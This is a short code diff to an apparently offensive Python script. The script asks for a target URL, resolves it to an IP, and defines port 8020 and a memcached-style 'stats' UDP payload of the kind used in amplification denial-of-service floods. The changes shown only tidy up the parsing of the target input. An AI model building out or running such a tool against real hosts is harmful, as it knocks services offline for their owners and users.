@@ -16,14 +16,15 @@ def cls():
         os.system("clear")
 cls()
 os.system("python src/logo.py")
-
-target = input(f"{GREEN}Enter Target URL:")
+target = input(f"{GREEN}Enter Target URL: ").strip()
 target = target.replace("http://", "")
 target = target.replace("https://", "")
 target = target.replace("www.", "")
+target = target.split("/")[0]
+
+print("target =", repr(target))
 
 ip = socket.gethostbyname(target)
-
 port = 8020
 joker = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
 
